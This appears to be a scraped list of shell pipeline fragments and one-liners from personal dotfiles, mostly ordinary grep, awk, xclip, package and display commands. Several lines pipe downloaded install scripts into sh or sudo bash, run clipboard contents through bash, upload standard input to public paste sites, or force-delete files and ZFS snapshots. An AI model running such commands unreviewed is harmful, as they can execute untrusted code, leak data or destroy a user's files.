| grep -iE --color=auto --exclude-dir=.git --exclude-dir=.svn --exclude-dir=.cvs --exclude-dir=.hg
| grep -iE
| grep -i error
| grep -i -e
| grep -i --color=tty
| grep -i --color=auto
| grep -i --color=always
| grep -i --color
| grep -i --
| grep -i $1
| grep -i
| grep -ei
| grep -e
| grep -c
| grep -a --line-buffered
| grep -a
| grep -Pin
| grep -Pi
| grep -P'
| grep -P
| grep -Isn
| grep -Iin
| grep -GF
| grep -F Image:
| grep -F --color=auto
| grep -F
| grep -Ei
| grep -E -v
| grep -E -i
| grep -E --color=auto
| grep -E
| grep -C2
| grep -C$i -i
| grep -A 5 -B 5 -i -e
| grep -3 -n -i --color=auto -v
| grep -3 -n -i --color=auto
| grep --with-filename --line-number --color=always
| grep --only
| grep --line-number --context=1
| grep --line-buffered -v
| grep --line-buffered -h
| grep --line-buffered
| grep --invert-match
| grep --ignore-case --invert-match
| grep --ignore-case
| grep --directories skip
| grep --color=yes -n
| grep --color=yes -Hn
| grep --color=tty
| grep --color=auto -ri
| grep --color=auto -n
| grep --color=auto -i
| grep --color=auto -P
| grep --color=auto --context=$i -i
| grep --color=auto --context=$i
| grep --color=auto
| grep --color=always -E
| grep --color=always -B 3 -A 3 -E
| grep --color=always
| grep --color -v
| grep --color -ni
| grep --color -iE
| grep --color -i -E
| grep --color -i
| grep --color -P
| grep --color -E
| grep --color
| grep -
| grep 'inet addr' \
| grep '^\.'
| grep '\.py$'
| grep '\.html$'
| grep $USER
| grep $NAME
| grep $1
| grep
| gq --color
| gpaste
| gomi
| gnuplot -p -e \
| gnuplot
| gnomon -t absolute
| glark
| gist -eo
| ghead
| gh
| gawk
| g -i
| g
| fzy
| fzf-tmux -d 10 --ansi --revsere
| fzf-tmux
| fzf -m
| fzf -e -m
| fzf --preview '$FZF_PREVIEW_CMD'
| fzf --multi
| fzf --height 30 --reverse --multi --cycle
| fzf --exact
| fzf --bind
| fzf --ansi -m
| fzf --ansi --select-1
| fzf --ansi --reverse --tac
| fzf --ansi --reverse
| fzf --ansi --preview
| fzf --ansi
| fzf ${FZF_DEFAULT_OPTS}
| fzf
| fx
| fpp
| fmt -
| find
| filter
| field
| fgrep -v
| fgrep -i
| fgrep -f ~/.friends
| fgrep
| festival --tts
| extract_line
| expand; \
| exp NODES
| exit
| esc
| entr -c
| emojify
| eless
| egrn
| egrep'
| egrep -vi
| egrep -v $LOG
| egrep -v
| egrep -ri
| egrep -o 'http://[0-9a-z/\._-]+\.mp3'
| egrep -iv
| egrep -i'
| egrep -i --color=auto
| egrep -i --color=always
| egrep -i --color
| egrep -i
| egrep -Hni $1
| egrep --ignore-case --color
| egrep --color=auto -v
| egrep --color=auto -n
| egrep --color=auto -l
| egrep --color=auto -i
| egrep --color=auto --ignore-case
| egrep --color=auto
| egrep --color=always
| egrep --color -v
| egrep --color -l
| egrep --color -i
| egrep --color
| egrep ${switches:+-$switches}
| egrep $rhs_switches $color
| egrep
| e
| dump
| dmenu -i -fn 'Input Mono-14' -nb '#121212' -nf '#395573' -sb '#5e468c' -sf '#cf4f88'
| disp
| diffstat
| diff -wy -
| diff -w -B -s -
| decolor
| cuts
| cutd
| cut -f3 -d"";"""
| cut -f1 -d' '
| cut -f1 -d"";"""
| cut -f1 -d
| cut -f
| cut -d: -f2 \
| cut -d' ' -f3
| cut -d' ' -f2
| cut -d' ' -f1"
| cut -d' ' -f1
| cut -d ' ' -f
| cut -d
| cut -c 7-)
| cut -c 1-$COLUMNS
| cut -c -$((COLUMNS - 5))
| cut
| curl -sF-=\<- qrenco.de
| curl -F 'text=<-' http://vpaste.net/
| curl -F 'sprunge=<-' http://sprunge.us
| curl -F 'f:1=<-' ix.io
| curl --silent --form 'f:1=<-' ix.io C
| crush
| copy-to-clipboard
| copy
| command grep --color=auto
| command grep
| columns -t
| column -ts
| column -t
| column
| colorize-http-status.sed
| colorit
| colordiff
| colorcat
| color-less
| color
| clippaste
| clipcopy
| clipboard'
| clipboard -i
| clipboard
| clip.exe
| clip
| cl 1
| ccze -A
| ccze
| cb
| cat_alias
| cat -n
| cat -l yaml
| cat -e
| cat -b
| cat -A
| cat
| canything
| c
| bust
| btee
| bq query --nouse_legacy_sql
| bcat
| bc -l
| bc
| bat -l yaml
| bat -l json
| bat --language=yaml
| bat --language=json
| bat --color=always
| bat
| base64 -w 0
| base64 -d
| base64 -D
| base64 --decode
| base64
| awkr $i
| awkp
| awkc $i
| awk_alias2
| awk_alias
| awk_ailas
| awk \
| awk END'{print NR}'
| awk -F: '{print \$9}'
| awk -F: '{print \$8}'
| awk -F: '{print \$7}'
| awk -F: '{print \$6}'
| awk -F: '{print \$5}'
| awk -F: '{print \$4}'
| awk -F: '{print \$3}'
| awk -F: '{print \$2}'
| awk -F: '{print \$1}'
| awk -F: '{ s+=\$2 } END { print s }'
| awk -F $'\t' '{print \$9}'
| awk -F $'\t' '{print \$8}'
| awk -F $'\t' '{print \$7}'
| awk -F $'\t' '{print \$6}'
| awk -F $'\t' '{print \$5}'
| awk -F $'\t' '{print \$4}'
| awk -F $'\t' '{print \$3}'
| awk -F $'\t' '{print \$2}'
| awk -F $'\t' '{print \$1}'
| awk --field-separator : '{print \$1}'
| awk '{ttl+=\$1} END{print ttl}'
| awk '{ttl+=\$1; count++} END{print ttl/count}'
| awk '{s+=\$1} END {print s}'
| awk '{print strftime(\
| awk '{print \$NF}'
| awk '{print \$9}'
| awk '{print \$8}'
| awk '{print \$7}'
| awk '{print \$6}'
| awk '{print \$5}'
| awk '{print \$4}'
| awk '{print \$3}'
| awk '{print \$2}'
| awk '{print \$1}'
| awk '{print \$${i}}'
| awk '{print \$$i}'
| awk '{\%#}'
| awk '{ sub(/inet6? (addr:)? ?/, \"
| awk '{ print \$2 }'
| awk '{ print \$1}'
| awk '{ print \$1 }'
| awk 'BEGIN{OFS=\"
| awk '!a[\$0]{print} {a[\$0]=1}'
| awk
| autopager $PAGER
| ask
| ansi2html.sh
| and-pipe copy
| agrep
| ag -v
| ag -p ~/.agignore
| ag -i
| ag -S
| ag --smart-case --color-match '30;47'
| ag --hidden
| ag
| ack-grep -v
| ack-grep -i
| ack-grep --passthru
| ack-grep --nocolor
| ack-grep
| ack -v --nocolor
| ack -i --nocolor
| ack -i --context
| ack --passthru
| ack
| acat
| a
| _grep-option
| \grep -i --color=auto -a
| \grep --color=always
| \grep
| \$PAGER
| V -
| TERM=vt100 less
| LESS=-iR less
| GLess
| DISPLAY=:0 xclip -selection clipboard
| >/dev/null 2>&1
| >/dev/null
| =grep
| 2>/dev/null
| /usr/share/vim/vim7[4-9]/macros/less.sh
| /usr/local/bin/clip
| /usr/bin/pbcopy
| /usr/bin/less -X -a -R
| /usr/bin/less
| /home/yoann/bin/qlog
| /home/yoann/bin/qfslog
| /dev/null
| /bin/grep -a --color=auto
| --help
| ${PAGER}
| ${PAGER:-less}
| ${EDITOR} -
| $__LESS
| $__FILTER_TOOL
| $VIM_COMMAND -
| $PASTEBINF
| $PAGER
| $HEADER_SORT1
| $GREP --color
| $GREP
| $FILTER_CMD $FILTER_OPTS
| $EDITOR_VIM_MIN -
| $EDITOR -R -
| $(pbcopy)
|
{{ bootstrap.path }} --reboot | tee -a {{ bootstrap.log_file }}
{{ bootstrap.path }} --poweroff | tee -a {{ bootstrap.log_file }}
{echo \`\`\`DONE && task did end.after:yesterday && echo TODO && wut && echo \`\`\`} | xclip -sel clip -i
{echo 'scale=6';cat} | bc
{ xs; echo; xp; } | xs_set_fzf_inline
{ xs; echo; xb; } | xs_set_fzf_inline
{ xp; echo; xs; } | xs_set_fzf_inline
{ xp; echo; xb; } | xs_set_fzf_inline
{ xb; echo; xs; } | xs_set_fzf_inline
{ xb; echo; xp; } | xs_set_fzf_inline
{ whoami; echo '@'; echo $HOSTNAME; echo ' in '; pwd;}| sed ':a;N;s/\n//;ba'
{ uname -v | grep NixOS >/dev/null 2>&1; }
{ uname -n; uname -o; uname -r; printf '\n\n' } | tr '\n' ' ' && echo ''
{ stty raw min 1 time 20 -echo; dd count=1 2> /dev/null | od -vAn -tx1; stty sane; }
{ ls /Library/StartupItems & ls ~/Library/StartupItems & ls /Library/LaunchDaemons & ls ~/Library/LaunchAgents; } | sort
{ ifconfig en0 && ifconfig en1; } | grep \
{ cat $WHITELIST; new_whitelist } | sq
{ cat $DARKLIST; new_darklist } | sq
{ cat $BLACKLIST; new_blacklist } | sq
{ bzcat | less; } <
{ br outdated -v ; bco } | sort
{ br ls --versions ; bcl } | sort
{ alias; } | sort
{ alias; git aliases; } | sort
{ alias; functions; } | fzf
{ alias; declare -f; } | which -i
zzfutebol | grep Corinthians
zzcpf | xclip -selection c
zzcnpj | xclip -selection c
zzbrasileirao | grep Corinthians
zypper search -is | grep -i
zypper ps | less
zsh_ls_colors | $PAGER
zsh -ixc : 2>&1 | grep -iE
zsh -i -xv -c exit 2>&1 | ts -i
zprof | less
zmv -n '(**/)(* *)' '$1${2//( #-## #| ##)/-}'
zmodload zsh/zprof; source ~/.zshrc; zprof | less
zmanage info >| $HOME/.dotfiles/zsh/zinfo.txt && echo 'zsh: exported zmanage info to: $HOME/.dotfiles/zsh/zinfo.txt'
zixiepkillapppre(){ ps -aux | grep -i $1}; zixiepkillapppre
zixienewtextfile && date +'%Y%m%d_%H%M%S_temp.txt' | xargs -I {} echo new file: `temp`/{}
zipinfo -1 $1 | xargs rm
zip -fr backup $(diff -c base . | awk
zgrep ssh /var/log/auth.log* | grep -i failed
zgrep '\[\(ERROR\|FATAL\)\]'
zfs list -t snapshot -o name -H | while read a; do echo Destroying $a; zfs destroy $a; done
zfs list -t snapshot -o $ZFSS_LIST_OPTIONS|grep
zfs list -t filesystem -o $ZFS_LIST_OPTIONS|grep
zfs list -t filesystem -o $ZFSS_LIST_OPTIONS|grep
zfs list -t all -o $ZFS_LIST_OPTIONS |grep
zfs list -t all -o $ZFSS_LIST_OPTIONS |grep
zfs list -H -o name -t snapshot | xargs -n1 zfs destroy
zeus rake routes | grep
zdump Asia/Calcutta|grep '[0-9][0-9]:[0-9][0-9]'
zcat_dir | parallel --pipe \
zcat | wc -l
zcat \!*|tar vxf -
zcat \!*|tar vtf -
zcat Payload | cpio -id
zcat /proc/config.gz | vim -
zcat /proc/config.gz | ${EDITOR} -
zcat /initrd.img | cpio -i -d -H newc --no-absolute-filenames
zcat $DB_FILE | grep
zathura ~/Downloads/`ls -t ~/Downloads | head -1`
z | peco
z | fzf
z $(z | fzf)
yum list | grep -i
yum list installed | grep -i
yum list installed | grep
yum list all |egrep
yum groupinfo '*' | less +/
yubi aws && pbpaste | aws-mfa
ytdl https://www.youtube.com/watch?v=mXRfApkMYZU --filter audio | mpv --no-video -
ytdl https://www.youtube.com/watch?v=05689ErDUdM --filter audio | mpv --no-video -
yt_plst | xargs -n 1 -P 8 youtube-dl $YT_ARGS
yrt -Q|grep
yq '[path(..)|map(if type==\
ypcat passwd | grep -i
ypcat passwd | awk -F: ' {print \$3 \
ypcat group | grep ^${1}
ypcat group | awk -F: ' {print \$3 \
ypcat -k passwd | grep -i
ypcat -k passwd | grep
ypcat -k netgroup | grep
ypcat -k group | grep
ypcat -k auto.home | grep
youtube-dl -q -o- 'https://www.youtube.com/watch?t=48&v=ILVfzx5Pe-A' | mplayer -really-quiet -vo null -cache 500 -
youtube-dl -q -o- 'http://www.youtube.com/watch?v=bd2B6SjMh_w' | mplayer -really-quiet -vo null -cache 500 -
youtube-dl -o - https://youtu.be/BaW_jenozKc | castnow --quiet -
youtube-dl -o - $(xsel) | mpv -
yodasay $(git branch 2>/dev/null | grep
yle-dl --latestepisode http://areena.yle.fi/tv/1790757 -o - | mplayer -
ykman oath code fg | awk '{print \$2}'
ykman oath code $(ykman oath list | fzf)
yhq|sqc
yes| perl $perl_p/mqx_makefile_auto_config.PL
yes|
yes ███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| lolcat
yes | yay
yes | xargs -I{} -P1
yes | trizen -Scc
yes | task stop
yes | sudo pacman -Syyuu && pacaur -u
yes | sudo pacman -Syyu
yes | sudo pacman -Syu && shutdown -P now
yes | sudo pacman -Syu && poweroff
yes | sudo pacman -Syu
yes | sudo pacman -Scc && sudo reflector --verbose --latest 10 --protocol https --sort rate --save /etc/pacman.d/mirrorlist && sudo pacman -Syy
yes | sudo pacman -S
yes | sudo pacman -Rs
yes | sudo apt-get update && sudo apt-get upgrade && notify-send -u low 'System Updated'
yes | sudo apt upgrade &&\
yes | sudo apt autoremove"
yes | rm -rvf
yes | rm -rf tmp/miniprofiler/*
yes | rm -r
yes | rm -f ~/.vim/swapfiles/*.sw*
yes | rm
yes | rlf
yes | repo upload --cbr .
yes | pip uninstall
yes | pfexec pkgadd -d http://www.blastwave.org/pkg_get.pkg all
yes | history -1
yes | gem install
yes | docker volume prune
yes | docker system prune
yes | docker container prune
yes | cp ~/.${SHELLNAME}_history.bak ~/.${SHELLNAME}_history; for i in {0..10000}; do echo; done; /usr/bin/clear; cd ~; exec ${SHELLNAME}
yes | cp ~/.${SHELLNAME}_history ~/.${SHELLNAME}_history.bak;
yes | cp -fr $BIN_DIR err.txt generated.file succ.txt /home/mandar/temp/
yes | cp -f ~/.bash_profile ~/.vimrc ~/.tmux.conf ~/src/dotfiles/
yes | cp
yes | clear_all
yes | arc feature --cleanup
yes | arc detect-depends
yes | \$HOME/Library/Android/sdk/tools/bin/sdkmanager --licenses
yes | ./manage.py populate_db
yes |
yes yes | terraform apply
yes yes | python vpn-script.py
yes y | php /root/dialer_code/Asterisk/asterisk_release.php dev
yes y | php /root/dialer_code/ACM/acm_release.php dev
yes no | /bin/rm -ri
yes loldongs | lolcat
yes hola | lolcat
yes Y | pm -U *.pkg.tar.xz
yes Thalía | toilet -F border --gay
yes Nuria | toilet -F border
yes 'dawn' | xargs say -v 'Bad News'
yes ' ' | git difftool
yay -Syyu --sudoloop && yes | yay -Sc
yay -R $(yay -Qtdq | sed -e 's/\n/\ /g')
yay -Qs | grep
yay -Qqe | grep
yay -Qq | rg -i
yay -Qe | grep
yay -Qdtq | yay -Rs -
yay -Q | grep -i
yay -Q | grep
yay -Q | dmenu -l 10
yarn test `git diff --name-only | grep __tests__/` --watch
yarn start | h -i $PORT
yarn run $(package_json_scripts | peco)
yarn lint | h -i $PORT
yarn global list | grep
yarn emu-prod | h -i $PORT
yarn emu | h -i $PORT
yarn deploy | h -i $PORT
yarn application -list | grep userid
yarn application -list | grep `whoami`
yarn $(find_npm_scripts | peco)
yard graph --dependencies --empty-mixins --full | dot -T png -o diagram.png
yaourt -Q|grep -i
yaourt -Qtdq | sudo pacman -Rns -
yaourt -Qqdt | yaourt -Rns -
yaourt -Qmq --aur | yaourt -Rs -
yaourt -Qet | grep -Ev
yaourt -Qe --color | sed '/[^haskel-]core/d'
yaourt -Qdtq --aur | yaourt -Rs -
yaourt -Q | wc -l
yaourt -Q | grep
yadm tag | sort -V
yadm status --short | awk
yadm ls-files | grep
yadm ls-files --modified | xargs yadm add
yadm list | grep
yadm list -a | column
yabai -m query --windows | jq '.[].app'
xz -d $(ls -la | grep
xz -9 | base64 -w $((COLUMNS-1))
xxd -u -p -c32 /dev/urandom | head -n1
xxd -p %1 | tr -d
xxd -l 3 -p /dev/random | tee >(xargs wasko -p) >(cowsay)
xxd -g4 -c 32 < /dev/random | pv -q --rate-limit 1000
xwininfo -root | sed -rn '/-geometry/s/[^0-9]*([0-9]+x[0-9]+).*/\1/p'
xwininfo -id $wid | awk
xwininfo -id $(xprop -root | awk '/_NET_ACTIVE_WINDOW\(WINDOW\)/{print $NF}')
xwininfo -id $(xprop -root 2> /dev/null | awk '/_NET_ACTIVE_WINDOW\(WINDOW\)/{print $NF}')
xwininfo -children -root |perl -ne
xwd -root | convert xwd:- ~/screenshot.png
xwd -root | convert xwd:- ~/screen.png
xwd -root | convert xwd:-
xwd -root | convert - capture.png
xwd -frame | convert xwd:- ~/windowshot.png
xulfiles | xargs grep $@
xsos -ay .|more
xset s noblank && xset -dpms && xset s off && echo Movie mode enabled! && echo 500 | sudo tee /sys/class/backlight/intel_backlight/brightness
xset -q | tail --lines=3
xset -q | grep \
xsel | xsel -i -b
xsel | xsel -b
xsel | xclip -sel clip
xsel | qrencode -t ANSIUTF8 -o-
xsel | ix
xsel | espeak -ven-us+f3 -s 175
xsel | clip
xsel -po|xsel --display :0 -bi
xsel -po | xsel -b
xsel -p -o | xsel -i -b
xsel -p -o | xsel -b
xsel -op | xsel -ib
xsel -ob | xargs git clone
xsel -ob | piknik -copy
xsel -ob | gcc -xc -
xsel -o | less
xsel -ip && xsel -op | xsel -ib
xsel -ib && xsel -ob | xsel -ip
xsel -i -p && xsel -o -p | xsel -i -b
xsel -b|p
xsel -bo | xsel -p
xsel -b | xsel
xsel -b | gpg
xsel -b -o | xclip
xsel --clipboard | spr
xsel --clipboard --output | xargs youtube-dl -x
xsel --clipboard --output | xargs wget
xsel --clipboard --output | qrencode -s 30 -o ~/Pictures/tmpqr.png && feh ~/Pictures/tmpqr.png
xrdb -query | grep
xrandr | grep current
xrandr | grep 'HDMI1 connected' && xrandr --output eDP1 --auto --output HDMI1 --auto --left-of eDP1
xrandr | grep '*'
xrandr -q|awk '/disconnected/ {print \$1}'
xrandr -q|awk '/connected/ {print \$1}'
xrandr -q|awk '/ connected/ {print \$1}'
xrandr -q | grep \
xrandr -q | awk 'BEGIN{name=\
xrandr -q | awk '/disconnected/{print \$1}'
xrandr -q | awk '/connected/{d=\$1}/*/{print d \
xrandr -q | awk '/connected/ {print \$1}'
xrandr -q | awk '/ connected/{print \$1}'
xrandr -q | awk '/ connected/{name=\$1} /*/{print name}'
xrandr --output VGA1 --off; echo 'awesome.restart()' | awesome-client;
xrandr --output VGA1 --left-of LVDS1 --mode 1920x1080; sleep 1s && echo 'awesome.restart()' | awesome-client;
xrandr --output DP2-3 --right-of eDP1 | xrandr --output DP2-3 --auto
xrandr --output DP2-3 --left-of eDP1 | xrandr --output DP2-3 --auto
xrandr --output $(xrandr | grep -o '^eDP[^ ]*') --brightness 1
xrandr --output $(xrandr | grep -o '^eDP[^ ]*') --brightness 0.5
xq . -x | bat -l xml
xprop|grep WM_CLASS
xprop|grep -i
xprop|egrep -e WM_NAME -e WM_CLASS -e WM_WINDOW_ROLE -e _NET_WM_NAME -e _NET_WM_STATE_FULLSCREEN
xprop|awk
xprop |less
xprop |awk '/WM_CLASS/{print $4}'
xprop | rg ^WM_
xprop | grep WM_CLASS
xprop | grep CLASS
xprop | grep -i role
xprop | grep -i 'role'
xprop | grep -i 'class'
xprop | awk '(\$1==\
xprop | awk
xprop _NET_WM_PID | cut -d' ' -f3
xprop WM_CLASS | grep -o '\
xmodmap -pke|less
xmodmap -pke | grep
xmlstarlet fo | pygmentize -l xml
xmllint --format - |pygmentize -l xml
xmllint --format - | source-highlight -s xml -f esc
xmllint --format - | pygmentize -lxml
xmllint --format - | pygmentize -l xml
xmllint --format - | highlight --out-format=ansi --syntax=xml
xless `ls -1tr | tail -1`
xkcdpass -n 4 | tr \ -
xkbprint -label name $DISPLAY - | gv -orientation=seascape -
xinput list | grep -Po 'Synaptics.*id=\K[0-9]+'
xinput disable $(xinput | grep
xfreerdp +clipboard /size:1580x932 /sound /microphone +unmap-buttons -grab-keyboard /d:<domain> /u:$LOGNAME /sec:tls /v:<host> > /dev/null 2>&1 &|
xfontsel -print|clipcopy
xfconf-query -c xfce4-keyboard-shortcuts -l -v | cut -d
xev |grep keysym
xev | sed -ne
xev | sed -n 's/^.*keycode *\([0-9]\+\).*$/keycode \1 = /p'
xev | grep keycode
xev | grep \
xev | grep -i keysym
xev | grep -e keycode -e button
xev | grep -A2 --line-buffered
xev | grep 'keycode'
xev | awk -F'[ )]+' '/^KeyPress/ { a[NR+2] } NR in a { printf \
xev | awk -F'[ )]+' '/^KeyPress/ { a[NR+2] } NR in a { printf
xev | awk -F
xev -event keyboard | egrep -o 'keycode.*\)'
xdpyinfo | grep resolution
xdpyinfo | grep dimensions
xdpyinfo | grep -B 1 -i resolution
xdpyinfo | grep 'dimensions:'
xdotool search --name 'Guake!' windowreparent `xwininfo -name 'Guake!' -int -tree | grep -o -P '(?<=Root\ window\ id\:).*(?=\(the)'`
xdotool search --class . | xargs -I % xprop -id %
xdg_menu | less
xdg-open $HOME/.cache/maybe-matrix.html && ls $HOME/Notes/Irgendwann-Vielleicht.md | entr $HOME/.dotfiles/scripts/maybe-matrix
xdg-open $(ls | percol)
xdg-open $(ls $HOME/Torrents/Complete | fzf)
xdebug_disable; cat tests.parallel | time parallel --gnu -j0; php vendor/bin/behat --format=progress; xdebug_enable
xdebug_disable; cat tests.parallel | time parallel --gnu -j0; php vendor/bin/behat --format=progress; php vendor/bin/behat -p background --format=progress --tags=process; xdebug_enable
xcrysden --pwo output.txt|less -E
xcrysden --pwi input.txt|less -E
xcrun simctl list | grep Booted
xcrun simctl list | egrep '(Booted)'
xcodebuild -workspace minne.xcworkspace/ -scheme minne | xcpretty
xclip -selection primary -o | xclip -selection clipboard -i
xclip -selection primary -o | xclip -selection clipboard
xclip -selection primary -f | xclip -selection clipboard -f
xclip -selection clipboard | xclip -selection clipboard -o
xclip -selection clipboard -t image/png -o | feh -
xclip -selection clipboard -t image/png -i ~/Pictures/Lobo/$(ls ~/Pictures/Lobo| shuf -n 1)
xclip -selection clipboard -o | zsh
xclip -selection clipboard -o | xclip -selection primary
xclip -selection clipboard -o | xclip -selection clipboard
xclip -selection clipboard -o | xclip -i; xclip -selection clipboard -o
xclip -selection clipboard -o | xclip -i
xclip -selection clipboard -o | wc
xclip -selection clipboard -o | qrencode -t UTF8
xclip -selection clipboard -f | xclip -selection p
xclip -selection clip-board | xclip -o -selection clip-board
xclip -sel primary -o | xclip -sel clip
xclip -sel clip < ~/.ssh/id_rsa.pub | echo 'Copied to clipboard.'
xclip -sel clip < ~/.ssh/id_rsa.pub | echo '=> Public key copied to pasteboard.'
xclip -sel clip < ~/.ssh/id_rsa.pub | echo '=> Public RSA key copied to clipboard.'
xclip -sel clip -o | xargs
xclip -sel clip -o | gpg --decrypt
xclip -sel c -f | xclip -sel p
xclip -sel backup -out | clip
xclip -se c -f | xclip -se p
xclip -o|pb
xclip -out | xclip -selection clipboard
xclip -out | xclip -in -selection clipboard
xclip -out -selection clipboard | xclip
xclip -o | ydcv
xclip -o | xclip -selection clipboard -i
xclip -o | xclip -selection clipboard
xclip -o | xclip -selection c
xclip -o | xclip -sel clip
xclip -o | xclip -in -selection c
xclip -o | xclip -i -selection clipboard; xclip -o
xclip -o | xclip -i -selection clipboard
xclip -o | xclip -i -sel clipboard
xclip -o | xargs wget
xclip -o | xargs -I{} ghq get {}
xclip -o | tr -d '\n' && echo
xclip -o | sed -e '\$a\'
xclip -o | p
xclip -o | jq '.'
xclip -o | i
xclip -o | gpg --clearsign
xclip -o | fb
xclip -o | espeak -a 2
xclip -o | espeak --stdin
xclip -o | encfs -S ~/Dropbox/Encripted/ ~/Private/
xclip -o | bash
xclip -o clipboard | xclip -selection clipboard
xclip -o -selection secondary | xclip -i -selection primary
xclip -o -selection secondary | xclip -i -selection clipboard
xclip -o -selection primary | xclip -i -selection secondary
xclip -o -selection primary | xclip -i -selection clipboard
xclip -o -selection p | xclip -selection c
xclip -o -selection p | xclip -i -selection c
xclip -o -selection clipboard|pb
xclip -o -selection clipboard | xclip -i -selection secondary
xclip -o -selection clipboard | xclip -i -selection primary
xclip -o -selection clipboard | xclip -i
xclip -o -selection clipboard | qrencode -o /tmp/copy.png && feh /tmp/copy.png && rm /tmp/copy.png
xclip -o -selection clipboard | base64 -d > /tmp/tmpimg.jpg && feh /tmp/tmpimg.jpg
xclip -o -selection clipboard |
xclip -o -selection -c | xclip
xclip -o -sel clipboard | xclip -i
xclip -o -sel clip | xsel -p
xclip -o -sel clip | xargs wget
xclip -o --sel | pbcopy
xclip -o --sel | pbCopy
xclip -i -selection primary -filter | xclip -i -selection clipboard
xclip -i -selection primary -f | xclip -i -selection clipboard
xclip -i -selection clipboard -o | vim -
xclip -i -selection clipboard -o >> /tmp/clipEdit; $EDITOR /tmp/clipEdit; cat /tmp/clipEdit | xclip -selection clipboard
xclip -i -f -selection primary | xclip -i -selection clipboard
xclip -i && xclip -o | tr -d
xclip -f -selection primary | xclip -f -selection clipboard
xbps-query -l | wc -l
xbps-query -l | grep
xbps-install -nuM | wc -l
xbacklight -get | xargs printf '%.0f%%\n'
xauth add $DISPLAY . $(head -c16 </dev/urandom | xxd -p -u)
xauth add $(xauth -f $SUDO_USER/.Xauthority list|tail -1)
xargs | sed
xargs | kill 2>1 /dev/null
xargs wc -l | sort -n -r
xargs stat -c %s | awk '{total+=\$1} END {print total}'
xargs shasum | \
xargs printf | xclip -sel C
xargs file|\
xargs echo -n | xclip -selection clipboard -i
xargs echo -n | xclip -selection clipboard
xargs echo -n | xclip -selection c &> /dev/null
xargs echo -n | xclip -selection c
xargs echo -n | xclip -sel clip
xargs echo -n | pbcopy
xargs -i echo less -S {}|sh
xargs -P30 -n1 ping -s1 -c1 -W1 | grep ttl
xargs -I {} man -t {} | open -fa Preview
xargs -I {} echo -e https://planet.openstreetmap.org/replication/minute/'{}'.osc.gz |\
xargs -0 -I {} echo {} | \
x tst results|less
x list | peco
x --help | peco
w|sort
w|cat
w| grep -v alicht
ww;scripts/extract-ikconfig ../out/target/product/msm8974/obj/KERNEL_OBJ/vmlinux | grep -rni poison
wttr.in | head -n 7
wtt timeclock | hledger -f - balance -p 'daily this week'
wpg -s $(wpg -l | fzf)
wpa_cli status 2> /dev/null | grep state=COMPLETED
wpa_cli ping 2> /dev/null | grep PONG
wp db export - | gzip > environment/initdb/initdb.sql.gz
workon gst; python manage.py show_urls | grep
workon adroll | cd ~/projects/adroll
workon $(workon | fzf --layout=reverse)
wmake 2>&1 | fun
wineserver -k; killall -9 wine wineserver; for i in `ps ax|egrep
wifi-password | pbcopy
wicd-cli --wireless -d | grep \
who|wc -l
who|sort
whois \$(curl -s https://icanhazip.com) | grep CIDR
whogit | grep `git config --get user.email`
whoami | ps u
whoami -groups -fo list | grep -i
whoami && hostname && history | tail -n 5
who | sort
who | grep `whoami`
who | grep \
who | grep -v $USER
who | cut -d' ' -f1
who | column -t
who | awk \
who | awk '{print \$4 \
who -iw | sort
while x=1; do /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I | grep CtlRSSI; sleep 0.5; done
while true; do; pytest --disable-warnings | less; done
while true; do tsize; sleep 0.1; done | uniq
while true; do time -p ls -d $HOME/dev/*/.git | while read line; do echo \$line; (cd \$line/..; time -p git fetch --all) ; done; date; echo ==== done ====; sleep 300; done
while true; do sl | lolcat; sleep 1; done
while true; do nmcli -c yes | head -1; ping 8.8.8.8; sleep 1; done
while true; do head -c8 /dev/urandom; sleep 0.10; done | hexdump -C
while true; do head -c8 /dev/urandom; sleep 0.02; done | hexdump -C
while true; do fortune | ponysay; sleep 30; done
while true; do fortune | espeak; sleep 2; done&
while true; do espeak -z -a 200 -p 70 --stdout Hey | paplay; sleep 1; done
while true; do echo 'Kys Olle Kys Olle Kys Olle Kys Olle Kys Olle Kys Olle Kys Olle Kys Olle Kys Olle Kys Olle Kys Olle Kys Olle Kys Olle Kys Olle Kys Olle Kys Olle Kys Olle Kys Olle Kys Olle Kys Olle Kys Olle Olle Kys Olle Kys Olle Kys Olle'; done | lolcat
while true; do doge | lolcat -a -d 100 -s 100 -p 1; done
while true; do dmesg | tail; done
while true; do dig www.google.com | grep time; sleep 2; done
while true; do date; ps auxf | awk '{if(\$8==\
while true; do date; done | uniq -c
while true; do clear; ls -a | cat; sleep 2; done
while true; do clear; gl4 -40 | cat -; sleep 15; done
while true; do clear; gl3 -40 | cat -; sleep 15; done
while true; do clear; gl2 -40 | cat -; sleep 15; done
while true; do clear; gl1 -40 | cat -; sleep 15; done
while true; do clear; git sts | cat; sleep 2; done
while true; do clear; git lg | cat; sleep 2; done
while true; do clear; git hist -5 | cat; sleep 3; done
while true; do brew uninstall --force $(brew leaves | pick); done;
while sleep 2; do ls ~/dev/mui/js/client/dist | entr -d npm run deploy ui-proxy; done
while echo | yaourt -R $(yaourt -Qdtq) 2>/dev/null; do :; done
while [ true ] ; do sleep 600 | ssh home; wait; done
while [ 1 ]; do rig | head -n 1; sleep 1; done
while [ 1 ]; do make; sleep 1; done | grep -v Built
while [ 1 ] ; do /projects/hnd/tools/linux/bin/iperf -i 1 -f m -w 2M -u -s | grep -v ID; sleep 1; done
while [ 1 ] ; do /projects/hnd/tools/linux/bin/iperf -i 1 -f m -w 2M -s | grep -v ID; sleep 1; done
while :; do sensors|while read x; do printf '% .23s\n'
while :; do date '+%T'; sleep 1; done | bar $BAROPT
while : ; do if (git status |grep 'Your branch is ahead') ; then git push; fi; sleep 1; date ;done
while (ps -ef |grep 'backupd$'); do sleep 60; done; shutdown -h +1
while (echo 'exit' | pry-remote > /dev/null 2>&1); do echo $'\u2620 Killed'; done
while ((i==i)); do date '+%T %D' | toilet -f term -F border --gay; sleep 1; clear; done
which mpstat >/dev/null && mpstat 1 1 | awk 'END{print 100-\$NF\
whatsmyip | pbcopy
whatis `compgen -c` | less
wget https://raw.githubusercontent.com/scopatz/nanorc/master/install.sh -O- | sh
wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -|sh
wget https://raw.githubusercontent.com/racaljk/hosts/master/hosts_tool/script_tool_for_linux.sh -O - | sudo bash -;sudo killall -HUP mDNSResponder
wget https://raw.github.com/ocaml/opam/master/shell/opam_installer.sh -O - | sh -s ~/.local/bin 4.07.0
wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh
